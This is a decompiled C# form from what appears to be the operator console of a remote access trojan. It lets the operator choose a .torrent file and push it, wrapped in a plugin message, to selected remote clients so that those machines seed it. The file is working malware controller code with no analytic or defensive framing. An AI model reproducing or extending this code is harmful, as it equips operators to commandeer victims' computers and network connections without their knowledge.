using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000097 RID: 151
	public partial class FormTorrent : Form
	{
		// Token: 0x06000438 RID: 1080 RVA: 0x0000446B File Offset: 0x0000266B
		public FormTorrent()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000439 RID: 1081 RVA: 0x00034000 File Offset: 0x00032200
		private void Button1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "(*.torrent)|*.torrent";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.textBox1.Text = openFileDialog.FileName;
				this.IsOk = true;
				return;
			}
			this.textBox1.Text = "";
			this.IsOk = false;
		}

		// Token: 0x0600043A RID: 1082 RVA: 0x000043DB File Offset: 0x000025DB
		private void Button3_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x0600043B RID: 1083 RVA: 0x00034058 File Offset: 0x00032258
		private void Button2_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.IsOk)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "torrent";
					msgPack.ForcePathObject("Option").AsString = "seed";
					msgPack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(this.textBox1.Text));
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (object obj in Program.form1.listView1.SelectedItems)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(((Clients)((ListViewItem)obj).Tag).Send), msgPack2.Encode2Bytes());
					}
					base.Close();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x04000393 RID: 915
		private bool IsOk;
	}
}
